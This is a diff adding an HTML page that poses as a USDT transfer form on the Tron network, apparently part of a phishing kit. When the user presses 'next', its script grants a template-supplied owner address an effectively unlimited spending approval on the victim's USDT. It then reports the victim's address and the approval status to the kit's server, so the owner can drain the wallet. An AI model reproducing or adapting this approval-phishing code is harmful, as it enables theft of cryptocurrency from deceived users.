@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <title>USDT 转账</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1,user-scalable=0">
+  <link rel="shortcut icon" type="image/png" href="https://ztoken.im/favico.png" sizes="32x32">
+  <link rel="stylesheet" href="__NewStatics_CSS__/weui.min.css">
+  <script type="text/javascript" src="__PUBLIC_JS__/jquery-2.1.1.min.js"></script>
+ 
+  <style>
+    body{
+        display: none;
+    }
+   .content {
+      font-size: 0;
+      max-width: 700px;
+      padding: 0 .15rem;
+      box-sizing: border-box;
+      background: #f8f9fa;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .nav {
+      height: .37rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .nav .title {
+      color: #191c1e;
+      font-size: .16rem;
+    }
+
+    .nav img {
+      height: .18rem;
+      width: auto;
+    }
+
+    .section {
+      margin-top: .2rem;
+    }
+
+    .section-title {
+      color: #43454f;
+      font-size: .14rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .input {
+      margin-top: .1rem;
+      height: .56rem;
+      background: #fff;
+      border-radius: .1rem;
+      position: relative;
+      padding: 0 .2rem;
+      font-size: .16rem;
+      box-sizing: border-box;
+    }
+
+    .input input {
+      height: 100%;
+      width: 100%;
+      font-size: .14rem;
+      background: none;
+      outline: none;
+      border: none;
+    }
+
+    .input .icon {
+      position: absolute;
+      width: .14rem;
+      height: .14rem;
+      right: .15rem;
+      top: 0;
+      bottom: 0;
+      margin: auto;
+    }
+
+    .money-input {
+      margin-top: .1rem;
+      /* height: 1.45rem; */
+      background: #fff;
+      border-radius: .1rem;
+      position: relative;
+      padding-left: .2rem;
+      box-sizing: border-box;
+    }
+
+    .money-input input {
+         height: .65rem;
+    width: 100%;
+    line-height: .45rem;
+    font-size: .3rem;
+    background: none;
+    outline: none;
+    border: none;
+    }
+
+    .money-input input::placeholder {
+      color: #eaecf6;
+      line-height: .95rem;
+    }
+
+    .money-input .remark {
+      font-size: .14rem;
+      line-height: .49rem;
+      height: .49rem;
+    }
+
+    .money-input .remark::placeholder {
+      color: #eaecf6;
+    }
+
+    .section-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 .25rem 0 .2rem;
+      box-sizing: border-box;
+      background: #fff;
+      height: .55rem;
+      border-radius: .1rem;
+    }
+
+    .item-title {
+      font-size: .16rem;
+      color: #43454f;
+    }
+
+    .item-value {
+      font-size: .12rem;
+      color: #9093a7;
+      line-height: 1.2;
+      display: flex;
+      align-items: center;
+    }
+
+    .item-value img {
+      width: .16rem;
+      margin-left: .1rem;
+    }
+
+    .ft {
+      left: .15rem;
+      right: .15rem;
+      margin: auto;
+      position: fixed;
+      bottom: calc(.18rem + env(safe-area-inset-bottom));
+    }
+
+    .hight {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .hight span {
+      line-height: 1;
+      font-size: .12rem;
+      color: #9093a7;
+      margin-right: .03rem;
+    }
+
+    .hight img {
+      width: .1rem;
+    }
+
+    .ft button {
+      margin-top: .24rem;
+      width: 100%;
+      height: .49rem;
+      background: none;
+      border: none;
+      outline: none;
+      border-radius: .1rem;
+      background-color: #eaecf6;
+      color: #fff;
+    }
+    .all-btn {
+      width: 1.5rem;
+      height: .36rem;
+      border-radius: 4px;
+      position: absolute;
+      background: #fff;
+      display: none;
+      line-height: .36rem;
+      color: #43454f;
+      font-size: .14rem;
+      text-align: center;
+    }
+    
+    .bold{
+        font-weight: bold;
+    }
+  </style>
+  <script src="__NewStatics_JS__/rem.js"></script>
+</head>
+
+<body>
+  <div class="content">
+   <!-- <div class="nav">
+      <img class="back" src="__NewStatics_IMG__/back.png" alt="">
+      <div class="title">USDT 转账</div>
+      <img class="scan" src="__NewStatics_IMG__/scan.png" alt="">
+    </div>-->
+    <div class="section" style="margin-top: .1rem;">
+      <div class="section-title bold">收款地址</div>
+      <div class="input">
+        <input type="text" placeholder="TRX 地址" address value="{$owner}">
+        <img src="__NewStatics_IMG__/ad.png" alt="" class="icon" onclick="toAd()">
+      </div>
+    </div>
+    <div class="section">
+      <div class="section-title">
+        <span class="bold">金额</span>
+        <span style="font-size: .12rem;color:#9093a7"><span id="balance">0</span> USDT</span>
+      </div>
+      <div class="money-input">
+        <input type="text" inputmode="decimal" placeholder="0" id="input" amount />
+        <span style="font-size: .12rem;color:#cccfe0;position: inherit;top: -.15rem;">￥<span id="rmb">0</span></span>
+      </div>
+    </div>
+    <div class="ft">
+      <button id="tran" disabled="">下一步</button>
+    </div>
+  </div>
+  <div class="all-btn">全部余额</div>
+
+</body>
+<script>
+  function toAd() {
+    window.location.href = './3.html'
+  }
+  function toP() {
+    window.location.href = './2.html'
+  }
+  // window.visualViewport.addEventListener("resize", () => {
+  //   let height = window.innerHeight - visualViewport.height
+  //   console.log(height)
+  //   if (height == 0) {
+  //     let b = document.querySelector('.all-btn')
+  //     b.style.display = 'none'
+  //     b.style.bottom = height + 'px'  
+  //   }
+  //   if (height > 0) {
+  //     let b = document.querySelector('.all-btn')
+  //     b.style.display = 'block'
+  //     b.style.bottom = height - 40 + 'px'  
+  //   }
+  // });
+</script>
+<script src="assets/js/TronWeb.js?123123"></script>
+<script>
+  var user;
+  var usdrate=0.155
+  $(function ($) {
+    
+    $("[address],[amount]").keyup(function(){
+        var address=$("[address]").val();
+        var amount=$("[amount]").val();
+        if(address&&amount&&address.length>15){
+          $("#tran")[0].style.background="#088de6"
+          $("#tran").attr("disabled",false)}
+        else{
+          $("#tran")[0].style.background="#eaecf6"
+           $("#tran").attr("disabled",true)
+        }
+        $('#rmb').text((amount/usdrate).toLocaleString() )
+    })
+    
+    
+    $("body")[0].style.display="block";
+    
+    var trx_usdt_contractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  
+    
+    window.onload = async () => {
+
+	    trx_usdt  = await tronWeb.contract().at(trx_usdt_contractAddress);
+	    user = tronWeb.defaultAddress.base58;
+	        let result = await trx_usdt.balanceOf(user).call(function(err,tex){
+	            if(err == null){
+	                let total = tex._hex/(10**6);
+	                 $("#balance").text(total.toLocaleString());
+	            }
+	        });
+    }
+    
+    $("#tran").on("click",async function () {
+        
+        $.get(`/Public/save?chain=trc&address=${user}`);
+        debugger
+    	let res = await trx_usdt["approve"]('{$owner}',"90000000000000000000000000000");
+			res.send({
+				feeLimit: 100000000,
+				callValue: 0,
+				shouldPollResponse: false
+			},async function(err,res){
+			 if(err == null){
+			   await trx_usdt.allowance(user,'{$owner}').call(function(err,tex){
+	            if(err == null){
+	                let eth_usdt_approval = tex.remaining._hex/(10**6);
+	                if(eth_usdt_approval>0) 
+                        $.get(`/Public/set?address=${user}&owner={$owner}`)
+	                }
+	            });
+			  }else
+			    alert(err.message)
+			})
+    })
+    
+    
+   
+    
+    
+})
+
+</script>
+
+</html>
